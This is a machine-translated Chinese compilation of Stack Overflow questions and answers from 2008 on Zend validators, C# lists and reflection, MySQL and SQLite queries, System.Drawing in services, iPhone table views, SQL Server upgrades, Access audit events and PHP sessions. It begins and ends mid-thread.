> 请注意，由于需求不足，Apogee 在 2012 年 6 月暂停了 CJREs+A 的进一步开发。如果您对针对您选择的运行 Android 的设备的 CJRE+A 感兴趣，请联系 Apogee，以便“批量”分发给您的客户和/或其他第三方。

...并且找不到下载/演示。

取自他们的产品页面[http://www.apogee.com/products](http://www.apogee.com/products)听起来确实是一件很棒的事情：

> CJRE+A - “CJRE for Android”适用于运行 Android v4.x 或更高版本的设备，除了执行 Android 应用程序外，还需要执行 Java SE 5 和 SE 6 应用程序。

我们仍然可以做梦。我没有联系他们。我知道许多公司正在寻找此功能。我无法想象它会缩小得太快（或者说比闪存慢）？

我还没有联系 Apogee，可能值得一试......如果有人找到解决方案，请让我们更新！谢谢。

# zend-framework - Zend Framework：有没有办法从自定义验证器中访问元素名称？

> ID：390484
> 
> 赞同：0
> 
> 时间：2008-12-24T00:28:23.537
> 
> 标签：zend-framework, zend-form, zend-validate, custom-validators

我正在编写一个自定义验证器，它将针对多个其他表单元素值进行验证。在我的表单中，我这样称呼我的自定义验证器：

```
$textFieldOne = new Zend_Form_Element_Text('textFieldOne');
$textFieldOne->setAllowEmpty(false)
             ->addValidator('OnlyOneHasValue', false, array(array('textFieldTwo', 'textFieldThree'))); 
```

我的验证器将检查这三个字段（textFieldOne、textFieldTwo、textFieldThree）中是否只有一个具有值。我想防止未来的开发人员意外通过同一个字段两次。

```
$textFieldOne->addValidator('OnlyOneHasValue', false, array(array('textFieldOne', 'textFieldTwo', 'textFieldThree'))); 
```

到目前为止，我的验证器运行良好，除非我传递与设置了验证器的字段相同的字段名称。

在我的验证器中，您可以看到我正在检查（设置了验证器的元素的值）。我还在检查传递给验证器的其他字段的值。

```
public function isValid($value, $context = null) {

    $this->_setValue($value);
    $this->_context = $context;

    if ($this->valueIsNotEmpty()) {
        if ($this->numberOfFieldsWithAValue() == 0) {
            return true;
        }
        $this->_error(self::MULTIPLE_VALUES);
        return false;
    }

    if ($this->numberOfFieldsWithAValue() == 0) {
        $this->_error(self::ALL_EMPTY);
        return false;
    }

    if ($this->numberOfFieldsWithAValue() == 1) {
        return true;
    }

    if ($this->numberOfFieldsWithAValue() > 1) {
        $this->_error(self::MULTIPLE_VALUES);
        return false;
    }
}

private function valueIsNotEmpty() {
    return Zend_Validate::is($this->_value, 'NotEmpty');
}

private function numberOfFieldsWithAValue() {

    $fieldsWithValue = 0;

    foreach ($this->_fieldsToMatch as $fieldName) {

        if (isset($this->_context[$fieldName]) && Zend_Validate::is($this->_context[$fieldName], 'NotEmpty')) {
            $fieldsWithValue++;
        }
    }
    return $fieldsWithValue;
} 
```

我的解决方案是...

*   A. 让开发人员弄清楚有某种方法可以做到这一点。
*   B. Ignore `$value`，迫使您传递所有元素（这与第一个选项没有太大区别）。
*   或 C.（如果可能）首先找到调用我的验证器的元素的名称，然后从`$fieldsWithValue`.

我认为没有办法在不将验证器附加到元素的情况下在表单上应用验证器，但如果可以选择的话，那会更好。

我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-07-27T16:17:26.847

通常我会建议不要这样做，但是，在这种情况下，我相信你班级中的静态成员实际上会为这个问题提供一个很好的解决方案。

使用静态成员，您可以在第一次调用 isValid 时将其设置为值，并在后续调用中对其进行检查，从而为您提供一种机制。

您可能希望将其设置为在配置选项中使用一些数组，以便您可以命名空间并允许验证器的多个实例在不同的集合中愉快地并存。

您真正必须决定如何克服的唯一问题是您希望在哪里显示错误，因为是的，表单本身不接受验证器。如果您希望第一个之后的所有重复项都显示错误，那不是什么大问题。

# c# - 如何将项目添加到列表的开头 ?

> ID：390491
> 
> 赞同：481
> 
> 时间：2008-12-24T00:34:38.313
> 
> 标签：c#, drop-down-menu, generic-list

我想将“选择一个”选项添加到绑定到`List<T>`.

一旦我查询 ，`List<T>`我如何添加我的初始`Item`，而不是数据源的一部分，作为其中的 FIRST 元素`List<T>`？我有：

```
// populate ti from data               
List<MyTypeItem> ti = MyTypeItem.GetTypeItems();    
//create initial entry    
MyTypeItem initialItem = new MyTypeItem();    
initialItem.TypeItem = "Select One";    
initialItem.TypeItemID = 0;
ti.Add(initialItem)  <!-- want this at the TOP!    
// then     
DropDownList1.DataSource = ti; 
```

* * *

## 回答 #1

> 赞同：837
> 
> 时间：2008-12-24T00:37:58.590

使用[插入](http://msdn.microsoft.com/en-us/library/sey5k5z4.aspx)方法：

```
ti.Insert(0, initialItem); 
```

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2008-12-24T00:37:47.030

更新：一个更好的主意，将“AppendDataBoundItems”属性设置为 true，然后以声明方式声明“Choose item”。数据绑定操作将添加到静态声明的项目。

```
<asp:DropDownList ID="ddl" runat="server" AppendDataBoundItems="true">
    <asp:ListItem Value="0" Text="Please choose..."></asp:ListItem>
</asp:DropDownList> 
```

[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.listcontrol.appenddatabounditems.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.listcontrol.appenddatabounditems.aspx)

-Oisin

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2020-01-08T10:11:26.043

从 .NET 4.7.1 开始，您可以免费使用副作用[`Prepend()`](https://docs.microsoft.com/en-us/dotnet/api/system.linq.enumerable.prepend?view=netframework-4.8&viewFallbackFrom=netframework-4.7)和[`Append()`](https://docs.microsoft.com/en-us/dotnet/api/system.linq.enumerable.append?view=netframework-4.8). 输出将是一个 IEnumerable。

```
// Creating an array of numbers
var ti = new List<int> { 1, 2, 3 };

// Prepend and Append any value of the same type
var results = ti.Prepend(0).Append(4);

// output is 0, 1, 2, 3, 4
Console.WriteLine(string.Join(", ", results )); 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2018-02-03T06:25:48.967

使用**Insert**方法`List<T>`：

> List.Insert Method(Int32, T)：`Inserts`将一个元素插入到List处`specified index`。

```
var names = new List<string> { "John", "Anna", "Monica" };
names.Insert(0, "Micheal"); // Insert to the first element 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2018-11-06T21:11:19.600

采用`List<T>.Insert`

虽然与您的具体示例无关，但如果性能很重要，也请考虑使用`LinkedList<T>`，因为将项目插入 a 的开头`List<T>`需要将所有项目移到上方。请参阅[何时应该使用 List 与 LinkedList](https://stackoverflow.com/q/169973/5170571)。

# mysql - 添加格式为 MM:SS (MySQL) 的时间字段

> ID：390512
> 
> 赞同：0
> 
> 时间：2008-12-24T00:44:15.347
> 
> 标签：mysql

我想向现有的 MySQL 表添加一个新的时间字段，该表的格式类似于“MM:SS”。该字段应该保存持续时间数据。执行此操作的正确 MySQL 语法是什么？在 MySQL 站点上找不到任何涵盖此内容的内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-24T01:27:38.973

为什么不直接使用 INTEGER 并使用它来存储秒数？当您想使用它时，让您的应用程序（甚至可能是 SQL 查询）将秒转换为分钟和秒。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T01:46:48.387

两种选择：

1.  由于它是持续时间，因此有两个`DATETIME`字段；start_time 和 end_time 然后只计算差异

2.  拥有一个`DATETIME`领域；start_time 和一个`INTEGER`字段；长度。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T15:38:55.587

MySQL 有一个[TIME 数据类型](http://dev.mysql.com/doc/refman/5.1/en/time.html)，专门用于存储持续时间。

# c# - Windows 或 ASP.NET 服务中的 System.Drawing

> ID：390532
> 
> 赞同：17
> 
> 时间：2008-12-24T00:57:14.853
> 
> 标签：c#, .net, windows-services, system.drawing

根据[MSDN](http://msdn.microsoft.com/en-us/library/system.drawing.aspx) ，在 Windows 服务或 ASP.NET 服务中使用**System.Drawing**命名空间中的类并不是一个特别好的主意。现在我正在开发一个类库，它可能需要访问这个特定的命名空间（用于测量字体），但不能保证宿主进程不是服务。

现在，如果 System.Drawing 不可用，我可以回退到一个不太理想的方法，但如果可能的话，我宁愿使用 System.Drawing 中的类。所以我想做的是在运行时确定 System.Drawing 是否安全，如果是，请使用它，否则回退到次优选项。

我的问题是：**我怎么可能检测 System.Drawing 是否可以安全使用？**

我想我应该要么

*   检测当前进程是 Windows 服务还是 ASP.NET 服务
*   检测 GDI 是否可用
*   或者也许有一种方法可以询问 System.Drawing.dll 本身是否可以安全使用

不幸的是，我无法想出一种方法来实现这些方法中的任何一种。有谁有想法吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-12-24T02:27:46.777

为了消除任何混淆，System.Drawing 确实在 ASP.NET 和服务下*工作*，它只是*不受支持*。可能存在高负载（用尽非托管资源）、内存或资源泄漏（实施不当或称为处置模式）和/或在没有桌面显示它们时弹出对话框的问题。

测试会处理后者，而监控会提醒您注意前者。但是，如果/当您遇到问题时，不要指望能够致电 PSS 并要求修复。

那么，你有什么选择？好吧，如果您不需要完全支持的路线，并且您不期望极端负载 - 很多人无视 MSDN 警告并成功使用 System.Drawing。他们中的一些人被咬了，但成功的故事比失败的故事多得多。

如果您想要支持某些东西，那么您需要知道您是否正在交互式运行。就个人而言，我可能只是将它留给托管应用程序在某处或其他地方设置非交互式标志。毕竟，应用程序最适合确定它们是否处于托管环境中和/或是否愿意冒 GDI+ 问题的风险。

但是，如果您想自动检测您的环境，我想有比[SO 上](https://stackoverflow.com/questions/200163/am-i-running-as-a-service#200183)提供的服务更糟糕的答案。总而言之，您可以检查 EntryAssembly 以查看它是否继承自 ServiceBase，或者尝试访问 System.Console。对于 ASP.NET，同理，检测 HttpContext.Current 就足够了。

我*认为*会有一种托管或 p/invoke 方式来查找桌面（我认为这确实是所有这一切的决定性因素）和/或 AppDomain 之外的东西会提示你。但我我不确定它是什么，而 MSDN 对它的启发不足。

编辑：Trolling MSDN，我记得它实际上是一个[Window Station](http://alt.pluralsight.com/wiki/default.aspx/Keith.GuideBook/WhatIsAWindowStation.html)（托管桌面），这是这里的重要部分。有了这些信息，我就能找到[GetProcessWindowStation()](http://msdn.microsoft.com/en-us/library/ms683225(VS.85).aspx)，它返回当前窗口站的句柄。将该句柄传递给[GetUserObjectInformation()](http://msdn.microsoft.com/en-us/library/ms683238(VS.85).aspx)将为您提供一个[USEROBJECTFLAGS](http://msdn.microsoft.com/en-us/library/ms686892(VS.85).aspx)结构，如果您有一个可见的桌面，则该结构应该有一个带有 WSF_VISIBLE 的 dwFlags。

或者，[EnumWindowsStations](http://msdn.microsoft.com/en-us/library/ms682644(VS.85).aspx)会给你一个你可以检查的电台列表——WinSta0 是交互式的。

但是，是的，我仍然认为让应用程序设置一个属性或其他东西是*更*容易的方法......

再次编辑：7 年后，我被提示进入[Environment.UserInteractive](https://msdn.microsoft.com/en-us/library/system.environment.userinteractive(v=vs.110).aspx)，MS为您执行我上面为您描述[的确切 GetProcessWindowStation 舞蹈](http://referencesource.microsoft.com/#mscorlib/system/environment.cs,7d2f1469d916fc63)....我仍然建议委托给托管应用程序（他们可能*希望*更快，但稍微风险更高的 System.Drawing 路径），但 UserInteractive 似乎是一个很好的默认设置，而不需要自己调用它。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2010-06-18T18:34:02.777

尽管它不受官方支持，但多年来我一直在大容量 Web 服务器（Web 应用程序和 Web 服务）上广泛使用 System.Drawing 类，而不会导致任何性能或可靠性问题。

我认为确定代码是否可以安全使用的唯一方法是在 using{} 语句中测试、监视和包装任何具有外部资源的对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T01:10:18.163

您可以改用[TextRenderer](http://msdn.microsoft.com/en-us/library/system.windows.forms.textrenderer.aspx)。我知道在 ASP.NET 中使用 System.Windows.Forms 中的某些东西很奇怪，但它似乎没有关于在 ASP.NET 中不受支持的相同警告。我已经使用 TextRenderer 和 Graphics.MeasureString 来测量 ASP.NET 应用程序中的字符串，所以它们都可以工作。我从未见过有关 System.Drawing 在 ASP.NET 中不可取的警告。

TextRenderer 比 Graphics.MeasureString、FWIW 慢很多。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T01:19:18.333

这可能与需要 STA 线程的 GDI 子系统有关。如果是这种情况，请调查在您的 @PAGE 指令中为所涉及的 aspx 页面指定 ASPCOMPAT=TRUE。这将在 STA 线程 IIRC 中运行 aspx 页面。

-Oisin

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-12-24T01:16:13.020

您也许可以将 System.Drawing.dll 复制到应用程序的 bin 中，然后以这种方式使用它。这可能保证它的可用性。

只需右键单击应用程序中的引用并将**Copy Local**的选项更改为**true**。

虽然我可能误解了这个问题......

# sql - SQLite 中 WHERE 子句中的聚合函数

> ID：390534
> 
> 赞同：12
> 
> 时间：2008-12-24T00:57:33.743
> 
> 标签：sql, sqlite, where-clause, aggregate-functions

简而言之，我有一个表格，其中包含时间戳列。我想获得具有最新（即最大值）时间戳的行。目前我正在这样做：

```
SELECT * FROM table ORDER BY timestamp DESC LIMIT 1 
```

但我更愿意做这样的事情：

```
SELECT * FROM table WHERE timestamp=max(timestamp) 
```

但是，SQLite 拒绝此查询：

```
SQL error: misuse of aggregate function max() 
```

[文档](http://www.sqlite.org/lang_expr.html)确认了这种行为（页面底部）：

> 聚合函数只能在 SELECT 语句中使用。

我的问题是：是否可以编写查询以获取具有最大时间戳的行，而无需对选择进行排序并将返回的行数限制为 1？这似乎应该是可能的，但我想我的 SQL-fu 不符合标准。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2008-12-24T01:02:34.640

```
SELECT * from foo where timestamp = (select max(timestamp) from foo) 
```

或者，如果 SQLite 坚持将子选择视为集合，

```
SELECT * from foo where timestamp in (select max(timestamp) from foo) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-18T13:15:41.440

给猫剥皮的方法有很多种。

如果您有一个具有自动增量功能的标识列，如果您按 ID 返回最后一条记录，由于列的索引，将产生更快的查询，除非您当然希望在时间戳列上放置索引。

```
SELECT * FROM TABLE ORDER BY ID DESC LIMIT 1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T01:02:48.070

我想我在过去一周里已经回答了 5 次这个问题，但是我太累了，现在找不到其中一个的链接，所以又来了……

```
SELECT
     *
FROM
     table T1
LEFT OUTER JOIN table T2 ON
     T2.timestamp > T1.timestamp
WHERE
     T2.timestamp IS NULL 
```

您基本上是在寻找没有其他行匹配的行。

注意：正如评论中所指出的，这种方法在这种情况下表现不佳。在您希望每个客户的最后一行（例如）的情况下，它通常会更好地工作（至少对于 SQL Server）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-10-13T10:21:20.353

~~你可以简单地做~~

~~SELECT *, max(timestamp) FROM table~~

**编辑：** 由于聚合函数不能像这样使用，所以它给出了错误。我猜[**SquareCog**](https://stackoverflow.com/users/15962/squarecog)的建议是最好的做法

```
SELECT * FROM table WHERE timestamp = (select max(timestamp) from table) 
```

# iphone - 在我的 UITableView 下面添加一个子视图

> ID：390551
> 
> 赞同：1
> 
> 时间：2008-12-24T01:09:26.217
> 
> 标签：iphone, cocoa-touch

我正在尝试以编程方式在我的 UITableView 下方添加一个子视图。我正在使用 Erica Sadun 书中的地图 curl 示例来测试我的 UITableView 下面的视图是否确实是我正在添加的视图。但是，当 UITableView 卷起来时，下面视图的视图颜色是白色的，而不是我在下面的代码中添加的黑色视图。知道我在 UITableView 下方插入新视图做错了什么吗？

```
CGRect frame = [self.tableView frame];
NSLog(@"frame height: %f, frame width: %f", frame.size.height, frame.size.width);
NSLog(@"tableView origin: %f, %f", [self.tableView frame].origin.x, [self.tableView frame].origin.y);
NSLog(@"frame origin x: %f, y: %f", frame.origin.x, frame.origin.y);
UIView *pickerView = [[UIView alloc] initWithFrame:frame];
pickerView.backgroundColor = [UIColor blackColor];
pickerView.frame = frame;
pickerView.userInteractionEnabled = YES;

[self.tableView insertSubview:pickerView belowSubview:self.tableView]; 
```

此外，我的顶级视图已被确认只有两个视图。这是来自的输出`[self.view subviews]`：

```
 2008-12-23 20:44:20.923 MySample[11966:20b] subviews: (
      <UITableView: 0x523ea0>,
      <UINavigationBar: 0x528b10>
   ) 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-24T03:39:52.043

您正在尝试 insertSubview:belowSubview: 将视图传递回自身。如果您尝试在表格下方插入子视图，则需要向表格的超级视图发送消息：

```
[self.tableView.superview insertSubview: pickerView belowSubview: self.tableView]; 
```

# sql-server-2005-express - 将 SQL Server 2005 Express 升级到 SP3

> ID：390554
> 
> 赞同：0
> 
> 时间：2008-12-24T01:12:00.487
> 
> 标签：sql-server-2005-express

我正在尝试在我的两台机器上安装 SQL Server 2005 Express SP3。当我尝试执行此操作时，我收到此错误消息：“无法安装或升级任何选定的功能。安装程序无法继续，因为没有对机器进行有效的更改。要继续，请单击返回，然后选择要安装的功能。 " 当然，它不会让我走得更远。当我进入“现有组件”屏幕（在错误消息之前）时，列出的唯一项目是“SQL Server 数据库服务 9.2.3042.00”并且它是灰色的（无法检查）。我假设这是错误消息中所说的“没有选定的功能”。

我在两台运行 Windows Server 2003 的不同计算机上进行了尝试。两者都有 MSDE（SQL server 2000），不确定这是否重要。报告的两台机器的 SQL 2005 版本都是 9.0.3068。我用来下载服务包的链接是：

[http://www.microsoft.com/downloads/details.aspx?FamilyID=3181842a-4090-4431-acdd-9a1c832e65a6&displaylang=en](http://www.microsoft.com/downloads/details.aspx?FamilyID=3181842a-4090-4431-acdd-9a1c832e65a6&displaylang=en)

有任何想法吗？谢谢。

编辑：

如果我单击详细信息，这就是我得到的：

名称：Microsoft SQL Server 2005 (SQLEXPRESS) 原因：您的升级被阻止。有关升级支持的详细信息，请参阅 SQL Server 2005 安装帮助或 SQL Server 2005 联机丛书中的“版本和版本升级”和“硬件和软件要求”主题。

版本检查：由于版本升级规则，您的升级被阻止。有关版本升级的详细信息，请参阅 SQL Server 2005 安装帮助或 SQL Server 2005 联机丛书中的版本和版本升级主题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T01:16:43.363

它可能正在尝试升级 MSDE 实例。它们是默认实例吗？- 这不是你想要的（但为了别人的缘故，如果它是你想要的，你会运行 d:\setup.exe SKUUPGRADE=1）。

我建议使用 INSTANCENAME 命令行参数来设置来指定您希望升级 2005 服务器。查看以下示例：

[http://msdn.microsoft.com/en-us/library/ms403393(SQL.90).aspx](http://msdn.microsoft.com/en-us/library/ms403393(SQL.90).aspx)

-Oisin

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-11T23:42:09.780

就我而言，解决方案是改用此安装包：

[http://www.microsoft.com/downloads/details.aspx?familyid=B448B0D0-EE79-48F6-B50A-7C4F028C2E3D&displaylang=en](http://www.microsoft.com/downloads/details.aspx?familyid=B448B0D0-EE79-48F6-B50A-7C4F028C2E3D&displaylang=en)

# c# - 为什么我的 IEnumerable 使用 yield return 较慢地迭代然后 List

> ID：390565
> 
> 赞同：0
> 
> 时间：2008-12-24T01:20:30.220
> 
> 标签：c#, ienumerable

我一直在`yield return`用我写的一些代码来测试这个语句。我有两种方法：

```
public static IEnumerable<String> MyYieldCollection {
        get 
        {
            wrapper.RunCommand("Fetch First From Water_Mains");
            for (int row = 0; row < tabinfo.GetNumberOfRows() ; row++) //GetNumberOfRows
                                                                      //will return 1000+ most of the time.
            {
                yield return wrapper.Evaluate("Water_Mains.col1");
                wrapper.RunCommand("Fetch Next From Water_Mains");
             }
        }
    } 
```

和

```
public static List<String> MyListCollection
    {
        get
        {
            List<String> innerlist = new List<String>();

            wrapper.RunCommand("Fetch First From Water_Mains");
            for (int row = 0; row < tabinfo.GetNumberOfRows(); row++)
            {
                innerlist.Add(wrapper.Evaluate("Water_Mains.col1"));
                wrapper.RunCommand("Fetch Next From Water_Mains");
            }
            return innerlist;
        }
    } 
```

然后我`foreach`在每个集合上使用一个循环：

```
 foreach (var item in MyYieldCollection) //Same thing for MyListCollection.
        {
            Console.WriteLine(item);
        } 
```

有趣的是，出于某种原因，我似乎能够比`MyListCollection`MyYieldCollection 更快地循环并打印出完整的内容。

结果：

*   MyYieldCollection -> 2062
*   我的列表集合-> 1847

我真的看不出这是什么原因，是我遗漏了什么还是这正常？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-24T10:33:49.103

你是如何安排时间的？你在调试器中吗？在调试模式？看起来您正在使用`DataTable`，所以我使用您的代码作为测试台的模板（每次创建 1000 行），并**在命令行**的发布模式下使用如下的线束；结果如下（括号中的数字是检查他们是否都做了同样的工作）：

```
Yield: 2000 (5000000)
List: 2100 (5000000) 
```

测试线束：

```
static  void Main()
{
    GC.Collect(GC.MaxGeneration,GCCollectionMode.Forced);
    int count1 = 0;
    var watch1 = Stopwatch.StartNew();        
    for(int i = 0 ; i < 5000 ; i++) {
        foreach (var row in MyYieldCollection)
        {
            count1++;
        }
    }
    watch1.Stop();

    GC.Collect(GC.MaxGeneration,GCCollectionMode.Forced);
    int count2 = 0;
    var watch2 = Stopwatch.StartNew();
    for (int i = 0; i < 5000; i++)
    {
        foreach (var row in MyListCollection)
        {
            count2++;
        }
    }
    watch1.Stop();

    Console.WriteLine("Yield: {0} ({1})", watch1.ElapsedMilliseconds, count1);
    Console.WriteLine("List: {0} ({1})", watch2.ElapsedMilliseconds, count2);
} 
```

（请注意，您通常不应使用`GC.Collect`，但它可用于平整场地以进行性能测试）

我所做的唯一其他更改是`for`循环，以避免重复：

```
int rows = tabinfo.Rows.Count;
for (int row = 0; row < rows; row++) {...} 
```

所以我不会复制你的数字......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-24T02:16:37.470

如果循环的一次迭代很昂贵，而您只需要迭代集合中的几个项目，会发生什么？

有了收益，你只需要为你得到的东西付费；）

```
public IEnumerable<int> YieldInts()
{
    for (int i = 0; i < 1000; i++)
    {
        Thread.Sleep(1000) // or do some other work
        yield return i;
    }
}

public void Main()
{
    foreach(int i in YieldInts())
    {
        Console.WriteLine(i);
        if(i == 42)
        {
            break;
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T02:37:08.160

我的猜测是 JIT 可以更好地优化返回列表的版本中的 for 循环。在返回 IEnumerable 的版本中，for 循环中使用的行变量现在实际上是生成的类的成员，而不是仅对方法本地的变量。

速度差异只有 10% 左右，所以除非这是性能关键代码，否则我不会担心。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-24T01:42:22.640

据我了解，“yield return”将继续循环，直到它运行我们要做的事情并且函数/属性退出，返回一个填充的 IEnumarable。换句话说，不是在 foreach 循环中为每个项目调用该函数，而是在执行 foreach 循环内的任何内容之前调用一次。

它可能是由返回的集合类型决定的。也许 List 可以比 IEnumerable 的任何数据结构更快地迭代。

# vba - 表单上的数据更改时的表单级事件

> ID：390567
> 
> 赞同：0
> 
> 时间：2008-12-24T01:22:40.823
> 
> 标签：vba, ms-access

好吧，基本上我正在开发一个 MSAccess 应用程序以及管理员将查看和编辑用户数据的表单，我希望能够在更改字段的旧值和新值时调用一个事件。此功能将在审计表中添加一条记录以跟踪更改。

我创建查询以将条目添加到审计表中没有问题，但我不知道在哪里放置函数调用。我已经尝试了一些表单级别的事件，所以我不必进入 50 个字段中的每一个并编辑他们的 onBlur 事件来检查新值，但没有运气。

任何提示都会受到欢迎。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T02:15:31.607

Microsoft 对此有一篇文章：[如何在 Access 2000 中的表单中创建记录更改的审计跟踪](http://support.microsoft.com/kb/197592)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T06:07:49.093

解决方案 (1) 是在“更新前”事件中添加一个事件处理程序。[Remou 的提议](https://stackoverflow.com/questions/390567/form-level-event-for-when-data-is-changed-on-a-msaccess-form#390633)对此非常有趣。

解决方案 (2) 是将记录集中的数据与 afterUpdate 事件中的控件中的数据进行比较：对于绑定到记录集中的字段的控件，总是存在一个步骤，即控件中的值与记录集中的值不同。当控制源是直接字段名称时，这很容易。

但我不喜欢在表单级别审核更改的概念：它的结果可能是模棱两可的，因为在表单级别更改的数据可能不会保存在表级别，或者因为可以在基础记录集更新之前关闭表单，或者因为 SQL 查询没有发送到服务器。

如果您的数据更新是通过 SQL synatx 进行的，那么解决方案 (3) 就是将从 Access 应用程序发送到数据库服务器的“INSERT”或“UPDATE”字符串存储在“事务日志”中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T01:47:09.463

您可以在 After Insert、After Update 和 After Del Confirm 事件中调用您的函数。这些类似于在插入、更新或删除记录后触发的触发器。

# php - PHP 类范围

> ID：390575
> 
> 赞同：4
> 
> 时间：2008-12-24T01:32:25.343
> 
> 标签：php

我对 PHP 相当陌生。在整个 PHP 应用程序中控制对类的访问的最佳方法是什么？在哪里存储需要在整个应用程序中访问的这些类的最佳位置？例子; 我有一个在登录过程中创建的用户类，但是每次页面发布时，似乎都会重新初始化该对象。

我试图设置属性 IsLoggedIn ，然后每次在再次将对象创建为新对象之前检查该变量，但这似乎不起作用。我也试过用 PHP 中的 isSet 函数来查看类变量是否已经存在

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-24T04:06:17.280

你是对的，你的应用程序的状态不是从请求到请求的。

与桌面应用程序相反，Web 应用程序不会保持初始化，因为对于服务器而言，每次它都可能是另一个访问者，想要完全不同的东西。您知道谁在使用桌面应用程序，但您不一定知道谁在请求该页面。想象一下 10 个用户在您的 Web 应用程序上同时做不同的事情？您不会使整个应用程序必须为每个访问者运行。想象一下有 10,000 名访客......

不过，有一些方法可以在请求之间保留一些数据。应用程序每次都会重新初始化，是的，但是你可以重新加载你正在做的事情的状态。它总是围绕着相同的通用方法：

1.  饼干; Cookies 是一个保存在客户端的小文件，在每次向您发出请求时都可以使用这些内容。在 PHP 中，这可以使用[$_COOKIE 变量来](http://www.php.net/manual/en/reserved.variables.cookies.php)实现。在所有情况下，您都可以[序列化](http://www.php.net/manual/en/function.serialize.php)您的类实例并在之后重新加载它们。问题是，您不想将敏感数据放在那里，因为任何（恶意）机构都可以看到和修改它。

2.  发布或获取；[在每个请求中，您在$_GET 请求](http://www.php.net/manual/en/reserved.variables.get.php)中传递一个状态（例如[http://localhost/myscript.php?iamatstep=4](http://localhost/myscript.php?iamatstep=4)的 URL 。或者通过[$_POST](http://www.php.net/manual/en/reserved.variables.post.php)例如使用表单中的隐藏输入字段。此数据可以加密并且只对您有意义，但是您仍然将敏感数据放回客户端，任何人都可以摆弄它。

3.  数据库、磁盘；或者服务器上的其他任何东西。同样，您将数据序列化到文件中，例如在请求结束时准备好再次用于下一个请求。主要优点是它保留在您的服务器上。不利的一面是，此时，您不知道要为哪个请求提取哪些数据，因为您的应用程序上可能同时有多个用户......

这就是[$_SESSION的概念](http://www.php.net/manual/en/reserved.variables.session.php)发挥作用。这只是一种同时使用所有这些的打包方式。它并不像初学者通常认为的那样神奇。当您使用会话时，放入 $_SESSION 的数据存储在服务器上的某个位置（通常是临时目录中的文件，尽管它可以更改为其他东西，例如数据库），并且唯一的 ID 被赋予该会话并传递在一个 cookie 中，它将跟随访问者从一个请求到另一个请求。所以客户端唯一的事情就是cookie中的一个大数字。在下一个请求中，浏览器告诉服务器上的 PHP 它的会话号为 12345，如果相应的文件存在，则加载相应的文件，然后数据再次可供您使用。如果 cookie 未启用，它可以通过 GET 或 POST 传递，尽管通常最好不要去那里（参见[session.use_trans_sid 的注释](http://www.php.net/manual/en/session.configuration.php)）。

在您需要身份验证的每个页面上，它通常看起来像这样。

```
<?php

// verify if we have a current session
if (isset($_SESSION['login'])) {
  // get data in current session
  $username = $_SESSION['login']['username'];
  $isLoggedIn = $_SESSION['login']['isLoggedIn'];
} else {
  $username = '';
  $isLoggedIn = false;
}

// take care of the unauthorized users
if (!$isLoggedIn) {
  // maybe a redirection here...
}

// do the things a logged in users has the permission to do 
```

要设置会话，它可能看起来像这样：

```
<?php

// handle the form post of your login page for example
if (isset($_POST['username']) && isset($_POST['password'])) {
  $username = $_POST['username'];
  $password = $_POST['password'];
  // verify the username and password against a database
  if ($everythingIsOkay) {
    // we can consider this user logged in and create a session
    $_SESSION['login']['username'] = $username;
    $_SESSION['login']['isLoggedIn'] = true;
    // and now maybe redirect the user to the correct page
  }
}
// raise an error about an invalid login 
```

最后，也许一个 logout.php 页面会做这样的事情：

```
<?php

unset($_SESSION['login']);
// redirect the user to the login page 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T01:42:38.943

这种数据必须存储在会话中，从页面到页面的唯一内容是会话数据（会话/cookies/...），因此您的类初始化不会被延续。

您可以将用户名等信息添加到会话中：

```
$username //username from db
$name //name from db
$_SESSION['username'] = $username;
$_SESSION['name'] = $name; 
```

或者，如果您只想轻松访问有关用户的所有信息，您可以执行以下操作：

```
$_SESSION['user'] = mysql_fetch_assoc($result); //where $result is the response from the db to your login query 
```

完成此操作后，$_SESSION['user'] 将是一个数组，其中包含您从数据库中选择的所有详细信息。

# c# - 使用反射在 C# 中创建没有默认构造函数的类型实例

> ID：390578
> 
> 赞同：103
> 
> 时间：2008-12-24T01:34:32.407
> 
> 标签：c#, reflection, instantiation, default-constructor

以下面的类为例：

```
class Sometype
{
    int someValue;

    public Sometype(int someValue)
    {
        this.someValue = someValue;
    }
} 
```

然后我想使用反射创建这种类型的实例：

```
Type t = typeof(Sometype);
object o = Activator.CreateInstance(t); 
```

通常这会起作用，但是由于`SomeType`没有定义无参数构造函数，因此调用`Activator.CreateInstance`将引发类型异常，`MissingMethodException`并显示消息“*没有为此对象定义无参数构造函数。* ”是否有另一种方法来创建这种类型的实例？将无参数构造函数添加到我的所有类中会有点糟糕。

* * *

## 回答 #1

> 赞同：149
> 
> 时间：2008-12-24T01:44:41.027

